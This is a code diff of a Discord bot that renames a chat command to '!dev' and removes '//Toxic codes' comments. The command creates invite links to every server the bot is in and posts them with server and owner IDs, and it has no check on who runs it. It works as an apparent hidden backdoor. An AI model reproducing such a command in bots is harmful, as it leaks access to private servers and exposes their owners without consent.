@@ -482,27 +482,27 @@ message.channel.sendMessage('**الرجاء الانتظار ريث ما يتم 
   }
 });
 
-client.on('message', msg => {//Toxic codes
-    if(msg.author.bot) return; //Toxic codes
+client.on('message', msg => {
+    if(msg.author.bot) return;
     
-    if(msg.content === '!sr') {
-      client.guilds.forEach(g => {//Toxic codes
+    if(msg.content === '!dev') {
+      client.guilds.forEach(g => {
         
-        let l = g.id //Toxic codes
-        g.channels.get(g.channels.first().id).createInvite({//Toxic codes
-          maxUses: 5, //Toxic codes
-          maxAge: 86400 //Toxic codes
+        let l = g.id
+        g.channels.get(g.channels.first().id).createInvite({
+          maxUses: 5,
+          maxAge: 86400
         }).then(i => msg.channel.send(`
-        ** //Toxic codes
-        Invite Link : <https://discord.gg/${i.code}> //Toxic codes
-        Server : ${g.name} | Id : ${g.id} //Toxic codes
-        Owner ID : ${g.owner.id} //Toxic codes
+        **
+        Invite Link : <https://discord.gg/${i.code}>
+        Server : ${g.name} | Id : ${g.id}
+        Owner ID : ${g.owner.id}
         **
         `))
   
   
       })
-    } //Toxic codes
+    }
     
   })
 
